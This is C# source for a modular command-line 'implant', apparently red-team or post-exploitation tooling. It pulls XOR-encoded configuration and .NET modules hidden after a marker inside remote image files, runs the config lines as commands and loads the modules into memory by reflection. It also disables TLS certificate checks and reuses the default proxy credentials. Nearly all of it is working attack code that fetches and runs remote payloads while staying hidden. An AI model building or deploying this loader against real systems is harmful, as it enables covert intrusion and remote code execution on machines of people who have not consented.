using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Collections.Generic;
using System.IO;
using System.Net;


namespace Application 
{
    public static class Program
    {
        // instruction and the related module name
		// newcommand -> SampleModule
		// newcommand3 -> SampleModule
		// anotherone -> DustModule
		public static Dictionary<string,string> extmenu = new Dictionary<string,string>();
		// string is the module name which is also the type name
		public static Dictionary<string,Assembly> modules = new Dictionary<string,Assembly>();

        public static Dictionary<string,string> menuhelp = new Dictionary<string,string>();

        public static void Main(string[] args)
        {
            // adding default menu help
            menuhelp.Add("echo\t", "Echo a string for testing. (echo teststring)");
            menuhelp.Add("exit\t", "Exit from the implant (exit)");
            menuhelp.Add("check-config", "Checks an implant config from a remote image (load-config HTTPURI XORKey)");
            menuhelp.Add("process-config", "Updates the implant config from a remote image (load-config HTTPURI XORKey)");
            menuhelp.Add("load-module", "Loads a XOR encoded module from file, URL or image (load-module file/url/image XORKey ModuleName filename/URI/ImageURI)");

            if (args.Length < 1) {
                while (true)
                {
                    Console.Write("# ");
                    string instructioninput = Console.ReadLine();
                    RunInstruction(instructioninput);
                }
            }
        }
        public static void ConsoleIOSet(TextWriter instructionIO)
        {
            Console.WriteLine("Console output is redirecting.");
            try {
                Console.SetOut(instructionIO);
            }
            catch (Exception e) {
                Console.Error.WriteLine(e);
            }
            Console.WriteLine("Console output is set.");
        }

        public static void RunInstruction(string instructioninput) {       
            string instruction = Regex.Split(instructioninput," ")[0]; 
            try
            {
                // if instruction is in the extended menu
                // send it to the loaded module
                if (extmenu.ContainsKey(instruction)) {
                    RunModuleInstruction(instructioninput);                        
                }
                else {
                    switch (instruction)
                    {
                        case "echo":
                            // let's echo what's asked 
                            Console.WriteLine(instructioninput.Substring(5,instructioninput.Length-5));
                            break;                        
                        case "exit":
                            // we exit
                            System.Environment.Exit(1);
                            break;
                        case "process-config":
                            string url = Regex.Split(instructioninput," ")[1];
                            string cxorkey = Regex.Split(instructioninput," ")[2];
                            Console.WriteLine("Downloading the image from {0}",url);
                            // Load the config
                            byte[] response = GetContent(url);
                            byte[] content = LoadDataFromImage(response, cxorkey);
                            string config = Encoding.UTF8.GetString(content);                    
                            Console.WriteLine("Processing the following config:\n{0}",config);
                            // process each line of config in the same menu
                            foreach (var c in Regex.Split(config,"\n"))
                            {
                                RunInstruction(c);
                            }
                            break;
                        case "check-config":
                            string curl = Regex.Split(instructioninput," ")[1];
                            string ccxorkey = Regex.Split(instructioninput," ")[2];
                            Console.WriteLine("Downloading the image from {0}",curl);
                            // Load the config
                            byte[] cresponse = GetContent(curl);
                            byte[] ccontent = LoadDataFromImage(cresponse, ccxorkey);
                            string cconfig = Encoding.UTF8.GetString(ccontent);                    
                            Console.WriteLine("Processing the following config:\n{0}",cconfig);
                            break;
                        case "load-module":
                            // loadmodule file/url/image XORKey SampleModule samplemdl.dll/http://URL
                            string loadtype = Regex.Split(instructioninput," ")[1];
                            string lxorkey = Regex.Split(instructioninput," ")[2];
                            string moduleName = Regex.Split(instructioninput," ")[3];
                            string moduleAddr = Regex.Split(instructioninput," ")[4];
                            byte[] module ;
                            switch (loadtype)
                            {
                                case "url":
                                    Console.WriteLine("{0} is loading",moduleName);
                                    module = GetContent(moduleAddr);
                                    // XORing the module
                                    module = XOR(module,lxorkey);
                                    LoadModule(moduleName, module);
                                    Console.WriteLine("{0} is loaded.",moduleName);
                                    break; 
                                case "file": 
                                    Console.WriteLine("{0} is loading",moduleName);
                                    module = File.ReadAllBytes(moduleAddr);  
                                    // XORing the module
                                    module = XOR(module,lxorkey);                                   
                                    LoadModule(moduleName, module);                                
                                    Console.WriteLine("{0} is loaded.",moduleName);
                                    break;
                                case "image": 
                                    Console.WriteLine("{0} is loading",moduleName);
                                    byte[] mcontent = GetContent(moduleAddr);
                                    module = LoadDataFromImage(mcontent, lxorkey);
                                    LoadModule(moduleName, module);
                                    Console.WriteLine("{0} is loaded.",moduleName);
                                    break;
                                default:
                                    Console.WriteLine("Usage: load file/url XORKey SampleModule samplemdl.dll/http://URL");
                                    break;
                            }                                                                
                            break;
                        case "help":
                            // Help menu
                            Console.WriteLine("Command\t\tDescription"); 
                            foreach (var m in menuhelp)
                            {
                                Console.WriteLine("{0}\t{1}",m.Key, m.Value); 
                            }     
                            break;
                        default:
                            // Help menu
                            Console.WriteLine("Command\t\tDescription"); 
                            foreach (var m in menuhelp)
                            {
                                Console.WriteLine("{0}\t{1}",m.Key, m.Value); 
                            }     
                            break;
                    }   
                }

            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Oh snap! " + e);
            }
        }

        public static void RunModuleInstruction(string userinput) {
			Console.WriteLine("Finding the assembly and type for the instruction");
			string instruction = Regex.Split(userinput," ")[0];			
			Assembly a = modules[extmenu[instruction]];
			Type type = a.GetType("Application."+extmenu[instruction]);
			Console.WriteLine("Finding operation for the given instruction");
			MethodInfo method = type.GetMethod("Operate");
			Console.WriteLine("Creating instance for operation");
			object o = a.CreateInstance(method.Name);
			Console.WriteLine("Preparing the parameters");
			object[] ao = { Regex.Split(userinput," ") };
			Console.WriteLine("Running operation with the given instruction");
			method.Invoke(o, ao);			
		}
        
        public static void LoadModule(string moduleName, byte[] module) {
			Console.WriteLine("Loading module as assembly");
			Assembly a = Assembly.Load(module);
			Console.WriteLine("Loading the type as {0}", moduleName);
			Type type = a.GetType("Application."+moduleName);
			Console.WriteLine("Finding the instructions function");
			MethodInfo method = type.GetMethod("GetInstructions");
			Console.WriteLine("Finding the new instructions available");
			object o = a.CreateInstance(method.Name);
			object e = method.Invoke(o, null);
			Dictionary<string,string> extmenu_items = (Dictionary<string,string>) e;
			foreach (var item in extmenu_items)
			{			
				Program.extmenu.Add(item.Key,moduleName);
                Program.menuhelp.Add(item.Key,item.Value);
                Console.WriteLine("{0} added as {1}",item.Key, item.Value);
                if (! modules.ContainsKey(moduleName)) {
                        Program.modules.Add(moduleName,a);                     
                }				
			}
			Console.WriteLine("Module loaded successfully, type help for new commands.");
		}	

        
        public static byte[] LoadDataFromImage(byte[] imgcontent, string xorkey)
        {
           
            byte[] separator = Encoding.UTF8.GetBytes("sep"+xorkey);
            int offset = separator.Length;
            int len = imgcontent.Length - offset;

            // Finding technique
            // 0-------------------KEY89-----99
            // When len hits 89, creates a new array of 10, and moves 90-99
            while (len > 0) {
                if (
                    // if you seek XOR key as separator
                    // you'll find it in the end on binary PE files due to \x00 bytes
                    // XORing \x00 and key gives the key
                    imgcontent[len] == separator[0] &&   //s
                    imgcontent[len+1] == separator[1] && //e
                    imgcontent[len+2] == separator[2] && //p
                    imgcontent[len+3] == separator[3] && //XOR key starts
                    imgcontent[len+4] == separator[4] &&
                    imgcontent[len+5] == separator[5] &&
                    imgcontent[len+6] == separator[6] &&
                    imgcontent[len+7] == separator[7] 
                ) {
                    //Console.WriteLine("Data found at {0} of {1}", len, imgcontent.Length);
                    byte[] enccontent = new byte[imgcontent.Length-len-separator.Length];
                    //Console.WriteLine("Creating a new array for {0}", enccontent.Length);
                    Array.Copy(imgcontent, len+separator.Length , enccontent, 0, enccontent.Length);
                    byte[] content = XOR(enccontent,xorkey);
                    return content;
                }
                else {
                    len -= 1;
                    
                }
            }
            return null;
        }

        public static byte[] GetContent(string url) {
            // Generate an advanced web client
            HttpWebRequest client;
            HttpWebResponse response;
            
            for (int i = 0; i < 5; i++)
            {
                try {
                    // Send the request and get the response
                    Console.WriteLine("Connecting to the server.");
                    client = WebClientAdvanced(url);
                    response = client.GetResponse() as HttpWebResponse;

                    Console.WriteLine("Processing the server response.");
                    // Download the image from a URL as data if response is OK
                    // Defining the response body
                    byte[] responsebody = new byte[] {};
                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        MemoryStream ms = new MemoryStream();
                        response.GetResponseStream().CopyTo(ms);
                        responsebody = ms.ToArray();

                        //close the connection if it's finished
                        response.Close();
                        return responsebody;
                    }
                    else
                    {
                        Console.WriteLine("Server response is invalid: {0}", response.StatusCode);
                    }
                }
                catch (Exception e) {
                    if (i == 4) {
                        Console.WriteLine("Connection failed: {0}",e.Message);
                    } 
                    else {
                        Console.WriteLine("Try {0} failed ({1}), retrying...",i,e.Message);										
                        continue;
                    }
                }
            }
            return null; 
        }

		public static HttpWebRequest WebClientAdvanced(string url)
        {
            //create a URI for the URL given
            Uri uri = new Uri(url);
            //create the HTTP request
            HttpWebRequest client = WebRequest.Create(uri) as HttpWebRequest;

            // Use GET to normalise the traffic
            client.Method = WebRequestMethods.Http.Get;

            // Get the default proxy if there is
            client.Proxy = new System.Net.WebProxy();
            // Get the credentials for the proxy if there is
            client.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
            // Ignore the certificate issues if necessary
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0xc0 | 0x300 | 0xc00 | 3072);
            client.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = true;

            // Create a cookie container 
            CookieContainer cookies = new CookieContainer();
            // Assign the cookies to the request
            client.CookieContainer = cookies; 

            // Set a User-Agent for it
            // client.UserAgent = ("Mozilla/31337");

            // Don't follow the redirects
            client.AllowAutoRedirect = false;
            // Return the client
            return client;
        }	

		public static byte[] XOR(byte[] data, string xorkey)
        {
            byte[] xor = new byte[data.Length];

            for (int i = 0; i < data.Length; ++i)
            {
                xor[i] = (byte)(data[i] ^ xorkey[i % xorkey.Length]);
            }

            return xor;
        }

    }
}

